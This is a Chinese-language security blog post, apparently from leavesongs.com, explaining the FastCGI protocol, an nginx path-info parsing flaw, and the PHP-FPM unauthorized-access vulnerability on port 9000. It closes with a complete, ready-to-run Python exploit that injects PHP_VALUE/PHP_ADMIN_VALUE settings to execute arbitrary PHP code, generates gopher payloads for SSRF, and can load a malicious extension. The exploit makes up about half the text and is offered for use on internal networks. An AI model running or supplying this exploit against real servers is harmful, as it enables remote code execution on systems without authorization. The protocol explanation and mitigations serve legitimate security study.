# PHP-FPM未授权访问漏洞

Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。

HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。

类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。

和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下：

```
typedef struct {
/* Header */
unsigned char version; // 版本
unsigned char type; // 本次record的类型
unsigned char requestIdB1; // 本次record对应的请求id
unsigned char requestIdB0;
unsigned char contentLengthB1; // body体的大小
unsigned char contentLengthB0;
unsigned char paddingLength; // 额外块大小
unsigned char reserved;

/* Body */
unsigned char contentData[contentLength];
unsigned char paddingData[paddingLength];
} FCGI_Record;
```

头由8个uchar类型的变量组成，每个变量1字节。其中，`requestId`占两个字节，一个唯一的标志id，以避免多个请求之间的影响；`contentLength`占两个字节，表示body的大小。

语言端解析了fastcgi头以后，拿到`contentLength`，然后再在TCP流里读取大小等于`contentLength`的数据，这就是body体。

Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。不需要该Padding的时候，将其长度设置为0即可。

可见，一个fastcgi record结构最大支持的body大小是`2^16`，也就是65536字节。

`type`就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过`type`来标志每个record的作用，用`requestId`作为同一次请求的id。

也就是说，每次请求，会有多个record，他们的`requestId`是相同的。

列出最主要的几种`type`：

[![14931267923354.jpg](https://www.leavesongs.com/media/attachment/2017/04/25/e29518b1-3574-426f-b75f-8cabbb89a15a.9efc537226ce.jpg)](https://www.leavesongs.com/media/attachment/2017/04/25/e29518b1-3574-426f-b75f-8cabbb89a15a.jpg)

看了这个表格就很清楚了，服务器中间件和后端语言通信，第一个数据包就是`type`为1的record，后续互相交流，发送`type`为4、5、6、7的record，结束时发送`type`为2、3的record。当后端语言接收到一个`type`为4的record后，就会把这个record的body按照对应的结构解析成key-value对，这就是环境变量。环境变量的结构如下：



```
typedef struct {
unsigned char nameLengthB0;  /* nameLengthB0  >> 7 == 0 */
unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */
unsigned char nameData[nameLength];
unsigned char valueData[valueLength];
} FCGI_NameValuePair11;

typedef struct {
unsigned char nameLengthB0;  /* nameLengthB0  >> 7 == 0 */
unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */
unsigned char valueLengthB2;
unsigned char valueLengthB1;
unsigned char valueLengthB0;
unsigned char nameData[nameLength];
unsigned char valueData[valueLength
((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
} FCGI_NameValuePair14;

typedef struct {
unsigned char nameLengthB3;  /* nameLengthB3  >> 7 == 1 */
unsigned char nameLengthB2;
unsigned char nameLengthB1;
unsigned char nameLengthB0;
unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */
unsigned char nameData[nameLength
((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
unsigned char valueData[valueLength];
} FCGI_NameValuePair41;

typedef struct {
unsigned char nameLengthB3;  /* nameLengthB3  >> 7 == 1 */
unsigned char nameLengthB2;
unsigned char nameLengthB1;
unsigned char nameLengthB0;
unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */
unsigned char valueLengthB2;
unsigned char valueLengthB1;
unsigned char valueLengthB0;
unsigned char nameData[nameLength
((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
unsigned char valueData[valueLength
((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
} FCGI_NameValuePair44;
```

这其实是4个结构，至于用哪个结构，有如下规则：

1. key、value均小于128字节，用`FCGI_NameValuePair11`
2. key大于128字节，value小于128字节，用`FCGI_NameValuePair41`
3. key小于128字节，value大于128字节，用`FCGI_NameValuePair14`
4. key、value均大于128字节，用`FCGI_NameValuePair44`

为什么我只介绍`type`为4的record？因为环境变量在后面PHP-FPM里有重要作用，之后写代码也会写到这个结构。`type`的其他情况，大家可以自己翻文档理解理解。

## PHP-FPM

FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。

FPM按照fastcgi的协议将TCP流解析成真正的数据。

举个例子，用户访问`http://127.0.0.1/index.php?a=1&b=2`，如果web目录是`/var/www/html`，那么Nginx会将这个请求变成如下key-value对：

```
{
'GATEWAY_INTERFACE': 'FastCGI/1.0',
'REQUEST_METHOD': 'GET',
'SCRIPT_FILENAME': '/var/www/html/index.php',
'SCRIPT_NAME': '/index.php',
'QUERY_STRING': '?a=1&b=2',
'REQUEST_URI': '/index.php?a=1&b=2',
'DOCUMENT_ROOT': '/var/www/html',
'SERVER_SOFTWARE': 'php/fcgiclient',
'REMOTE_ADDR': '127.0.0.1',
'REMOTE_PORT': '12345',
'SERVER_ADDR': '127.0.0.1',
'SERVER_PORT': '80',
'SERVER_NAME': "localhost",
'SERVER_PROTOCOL': 'HTTP/1.1'
}
```

这个数组其实就是PHP中`$_SERVER`数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充`$_SERVER`数组，也是告诉fpm：“我要执行哪个PHP文件”。

PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行`SCRIPT_FILENAME`的值指向的PHP文件，也就是`/var/www/html/index.php`。

## [Nginx（IIS7）解析漏洞](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#nginxiis7)

Nginx和IIS7曾经出现过一个PHP相关的解析漏洞（测试环境`https://github.com/phith0n/vulhub/tree/master/nginx_parsing_vulnerability`），该漏洞现象是，在用户访问`http://127.0.0.1/favicon.ico/.php`时，访问到的文件是favicon.ico，但却按照.php后缀解析了。

用户请求`http://127.0.0.1/favicon.ico/.php`，nginx将会发送如下环境变量到fpm里：

```
{
...
'SCRIPT_FILENAME': '/var/www/html/favicon.ico/.php',
'SCRIPT_NAME': '/favicon.ico/.php',
'REQUEST_URI': '/favicon.ico/.php',
'DOCUMENT_ROOT': '/var/www/html',
...
}
```

正常来说，`SCRIPT_FILENAME`的值是一个不存在的文件`/var/www/html/favicon.ico/.php`，是PHP设置中的一个选项`fix_pathinfo`导致了这个漏洞。PHP为了支持Path Info模式而创造了`fix_pathinfo`，在这个选项被打开的情况下，fpm会判断`SCRIPT_FILENAME`是否存在，如果不存在则去掉最后一个`/`及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。

所以，第一次fpm发现`/var/www/html/favicon.ico/.php`不存在，则去掉`/.php`，再判断`/var/www/html/favicon.ico`是否存在。显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。

正确的解决方法有两种，一是在Nginx端使用`fastcgi_split_path_info`将path info信息去除后，用tryfiles判断文件是否存在；二是借助PHP-FPM的`security.limit_extensions`配置项，避免其他后缀文件被解析。

## `security.limit_extensions`配置

写到这里，PHP-FPM未授权访问漏洞也就呼之欲出了。PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。

此时，`SCRIPT_FILENAME`的值就格外重要了。因为fpm是根据这个值来执行php文件的，如果这个文件不存在，fpm会直接返回404：

[![14931285844835.jpg](https://www.leavesongs.com/media/attachment/2017/04/25/703367c4-af98-4702-85f0-794b30776a4f.073e567856db.jpg)](https://www.leavesongs.com/media/attachment/2017/04/25/703367c4-af98-4702-85f0-794b30776a4f.jpg)

在fpm某个版本之前，我们可以将`SCRIPT_FILENAME`的值指定为任意后缀文件，比如`/etc/passwd`；但后来，fpm的默认配置中增加了一个选项`security.limit_extensions`：

```
; Limits the extensions of the main script FPM will allow to parse. This can
; prevent configuration mistakes on the web server side. You should only limit
; FPM to .php extensions to prevent malicious users to use other extensions to
; exectute php code.
; Note: set an empty value to allow all extensions.
; Default Value: .php
;security.limit_extensions = .php .php3 .php4 .php5 .php7
```

其限定了只有某些后缀的文件允许被fpm执行，默认是`.php`。所以，当我们再传入`/etc/passwd`的时候，将会返回`Access denied.`：

[![14931290357686.jpg](https://www.leavesongs.com/media/attachment/2017/04/25/99d10f40-7dc3-46f3-a0bb-dae71e9d550b.30fa707133a3.jpg)](https://www.leavesongs.com/media/attachment/2017/04/25/99d10f40-7dc3-46f3-a0bb-dae71e9d550b.jpg)

>ps. 这个配置也会影响Nginx解析漏洞，我觉得应该是因为Nginx当时那个解析漏洞，促成PHP-FPM增加了这个安全选项。另外，也有少部分发行版安装中`security.limit_extensions`默认为空，此时就没有任何限制了。

由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。

万幸的是，通常使用源安装php的时候，服务器上都会附带一些php后缀的文件，我们使用`find / -name "*.php"`来全局搜索一下默认环境：

[![14931297810961.jpg](https://www.leavesongs.com/media/attachment/2017/04/25/15695b8e-79ae-4f32-b061-cc5f52236e18.a5365d20818a.jpg)](https://www.leavesongs.com/media/attachment/2017/04/25/15695b8e-79ae-4f32-b061-cc5f52236e18.jpg)

找到了不少。这就给我们提供了一条思路，假设我们爆破不出来目标环境的web目录，我们可以找找默认源安装后可能存在的php文件，比如`/usr/local/lib/php/PEAR.php`。

## 任意代码执行

那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？

理论上当然是不可以的，即使我们能控制`SCRIPT_FILENAME`，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。

但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，`auto_prepend_file`和`auto_append_file`。

`auto_prepend_file`是告诉PHP，在执行目标文件之前，先包含`auto_prepend_file`中指定的文件；`auto_append_file`是告诉PHP，在执行完成目标文件后，包含`auto_append_file`指向的文件。

那么就有趣了，假设我们设置`auto_prepend_file`为`php://input`，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项`allow_url_include`）

那么，我们怎么设置`auto_prepend_file`的值？

这又涉及到PHP-FPM的两个环境变量，`PHP_VALUE`和`PHP_ADMIN_VALUE`。这两个环境变量就是用来设置PHP配置项的，`PHP_VALUE`可以设置模式为`PHP_INI_USER`和`PHP_INI_ALL`的选项，`PHP_ADMIN_VALUE`可以设置所有选项。（`disable_functions`除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）

所以，我们最后传入如下环境变量：

```
{
'GATEWAY_INTERFACE': 'FastCGI/1.0',
'REQUEST_METHOD': 'GET',
'SCRIPT_FILENAME': '/var/www/html/index.php',
'SCRIPT_NAME': '/index.php',
'QUERY_STRING': '?a=1&b=2',
'REQUEST_URI': '/index.php?a=1&b=2',
'DOCUMENT_ROOT': '/var/www/html',
'SERVER_SOFTWARE': 'php/fcgiclient',
'REMOTE_ADDR': '127.0.0.1',
'REMOTE_PORT': '12345',
'SERVER_ADDR': '127.0.0.1',
'SERVER_PORT': '80',
'SERVER_NAME': "localhost",
'SERVER_PROTOCOL': 'HTTP/1.1'
'PHP_VALUE': 'auto_prepend_file = php://input',
'PHP_ADMIN_VALUE': 'allow_url_include = On'
}
```

设置`auto_prepend_file = php://input`且`allow_url_include = On`，然后将我们需要执行的代码放在Body中，即可执行任意代码。

效果如下：

[![14931311523859.jpg](https://www.leavesongs.com/media/attachment/2017/04/25/e3c3329d-4e0e-4eec-9ea6-4e621cf01f9b.f4321b6236f8.jpg)](https://www.leavesongs.com/media/attachment/2017/04/25/e3c3329d-4e0e-4eec-9ea6-4e621cf01f9b.jpg)

## EXP编写

上图中用到的EXP，就是根据之前介绍的fastcgi协议来编写的，代码如下：https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 。兼容Python2和Python3，方便在内网用。

代码：

```python
import socket
import random
import argparse
import sys
from io import BytesIO
import base64
import urllib
# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client
PY2 = True if sys.version_info.major == 2 else False
def bchr(i):
if PY2:
return force_bytes(chr(i))
else:
return bytes([i])
def bord(c):
if isinstance(c, int):
return c
else:
return ord(c)
def force_bytes(s):
if isinstance(s, bytes):
return s
else:
return s.encode('utf-8', 'strict')
def force_text(s):
if issubclass(type(s), str):
return s
if isinstance(s, bytes):
s = str(s, 'utf-8', 'strict')
else:
s = str(s)
return s
class FastCGIClient:
"""A Fast-CGI Client for Python"""
# private
__FCGI_VERSION = 1
__FCGI_ROLE_RESPONDER = 1
__FCGI_ROLE_AUTHORIZER = 2
__FCGI_ROLE_FILTER = 3
__FCGI_TYPE_BEGIN = 1
__FCGI_TYPE_ABORT = 2
__FCGI_TYPE_END = 3
__FCGI_TYPE_PARAMS = 4
__FCGI_TYPE_STDIN = 5
__FCGI_TYPE_STDOUT = 6
__FCGI_TYPE_STDERR = 7
__FCGI_TYPE_DATA = 8
__FCGI_TYPE_GETVALUES = 9
__FCGI_TYPE_GETVALUES_RESULT = 10
__FCGI_TYPE_UNKOWNTYPE = 11
__FCGI_HEADER_SIZE = 8
# request state
FCGI_STATE_SEND = 1
FCGI_STATE_ERROR = 2
FCGI_STATE_SUCCESS = 3
def __init__(self, host, port, timeout, keepalive):
self.host = host
self.port = port
self.timeout = timeout
if keepalive:
self.keepalive = 1
else:
self.keepalive = 0
self.sock = None
self.requests = dict()
def __connect(self):
self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
self.sock.settimeout(self.timeout)
self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
# if self.keepalive:
#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
# else:
#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
try:
self.sock.connect((self.host, int(self.port)))
except socket.error as msg:
self.sock.close()
self.sock = None
print(repr(msg))
return False
return True
def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
length = len(content)
buf = bchr(FastCGIClient.__FCGI_VERSION) \
+ bchr(fcgi_type) \
+ bchr((requestid >> 8) & 0xFF) \
+ bchr(requestid & 0xFF) \
+ bchr((length >> 8) & 0xFF) \
+ bchr(length & 0xFF) \
+ bchr(0) \
+ bchr(0) \
+ content
return buf
def __encodeNameValueParams(self, name, value):
nLen = len(name)
vLen = len(value)
record = b''
if nLen < 128:
record += bchr(nLen)
else:
record += bchr((nLen >> 24) | 0x80) \
+ bchr((nLen >> 16) & 0xFF) \
+ bchr((nLen >> 8) & 0xFF) \
+ bchr(nLen & 0xFF)
if vLen < 128:
record += bchr(vLen)
else:
record += bchr((vLen >> 24) | 0x80) \
+ bchr((vLen >> 16) & 0xFF) \
+ bchr((vLen >> 8) & 0xFF) \
+ bchr(vLen & 0xFF)
return record + name + value
def __decodeFastCGIHeader(self, stream):
header = dict()
header['version'] = bord(stream[0])
header['type'] = bord(stream[1])
header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
header['paddingLength'] = bord(stream[6])
header['reserved'] = bord(stream[7])
return header
def __decodeFastCGIRecord(self, buffer):
header = buffer.read(int(self.__FCGI_HEADER_SIZE))
if not header:
return False
else:
record = self.__decodeFastCGIHeader(header)
record['content'] = b''
if 'contentLength' in record.keys():
contentLength = int(record['contentLength'])
record['content'] += buffer.read(contentLength)
if 'paddingLength' in record.keys():
skiped = buffer.read(int(record['paddingLength']))
return record
def request(self, nameValuePairs={}, post=''):
if not self.__connect():
print('connect failure! please check your fasctcgi-server !!')
return
requestId = random.randint(1, (1 << 16) - 1)
self.requests[requestId] = dict()
request = b""
beginFCGIRecordContent = bchr(0) \
+ bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
+ bchr(self.keepalive) \
+ bchr(0) * 5
request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
beginFCGIRecordContent, requestId)
paramsRecord = b''
if nameValuePairs:
for (name, value) in nameValuePairs.items():
name = force_bytes(name)
value = force_bytes(value)
paramsRecord += self.__encodeNameValueParams(name, value)
if paramsRecord:
request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)
if post:
request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)
self.sock.send(request)
self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
self.requests[requestId]['response'] = b''
return self.__waitForResponse(requestId)
def gopher(self, nameValuePairs={}, post=''):
requestId = random.randint(1, (1 << 16) - 1)
self.requests[requestId] = dict()
request = b""
beginFCGIRecordContent = bchr(0) \
+ bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
+ bchr(self.keepalive) \
+ bchr(0) * 5
request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
beginFCGIRecordContent, requestId)
paramsRecord = b''
if nameValuePairs:
for (name, value) in nameValuePairs.items():
name = force_bytes(name)
value = force_bytes(value)
paramsRecord += self.__encodeNameValueParams(name, value)
if paramsRecord:
request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)
if post:
request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)
return request
def __waitForResponse(self, requestId):
data = b''
while True:
buf = self.sock.recv(512)
if not len(buf):
break
data += buf
data = BytesIO(data)
while True:
response = self.__decodeFastCGIRecord(data)
if not response:
break
if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
if requestId == int(response['requestId']):
self.requests[requestId]['response'] += response['content']
if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
self.requests[requestId]
return self.requests[requestId]['response']
def __repr__(self):
return "fastcgi connect host:{} port:{}".format(self.host, self.port)
if __name__ == '__main__':
parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
parser.add_argument('host', help='Target host, such as 127.0.0.1')
parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php echo "PWNed";?>')
parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)
parser.add_argument('-e', '--ext', help='ext absolute path', default='')
parser.add_argument('-if', '--include_file', help='evil.php absolute path', default='')
parser.add_argument('-u', '--url_format', help='generate gopher stream in url format', nargs='?',const=1)
parser.add_argument('-b', '--base64_format', help='generate gopher stream in base64 format', nargs='?',const=1)
args = parser.parse_args()
client = FastCGIClient(args.host, args.port, 3, 0)
params = dict()
documentRoot = "/"
uri = args.file
params = {
'GATEWAY_INTERFACE': 'FastCGI/1.0',
'REQUEST_METHOD': 'POST',
'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
'SCRIPT_NAME': uri,
'QUERY_STRING': '',
'REQUEST_URI': uri,
'DOCUMENT_ROOT': documentRoot,
'SERVER_SOFTWARE': 'php/fcgiclient',
'REMOTE_ADDR': '127.0.0.1',
'REMOTE_PORT': '9985',
'SERVER_ADDR': '127.0.0.1',
'SERVER_PORT': '80',
'SERVER_NAME': "localhost",
'SERVER_PROTOCOL': 'HTTP/1.1',
'CONTENT_TYPE': 'application/text',
'CONTENT_LENGTH': "%d" % len(args.code),
'PHP_VALUE': 'auto_prepend_file = php://input',
'PHP_ADMIN_VALUE': 'allow_url_include = On'
}
if args.ext and args.include_file:
#params['PHP_ADMIN_VALUE']='extension = '+args.ext
params['PHP_ADMIN_VALUE']="extension_dir = /var/www/html\nextension = ant.so"
params['PHP_VALUE']='auto_prepend_file = '+args.include_file
if not args.url_format and not args.base64_format :
response = client.request(params, args.code)
print(force_text(response))
else:
response = client.gopher(params, args.code)
if args.url_format:
print(urllib.quote(response))
if args.base64_format:
print(base64.b64encode(response))
```


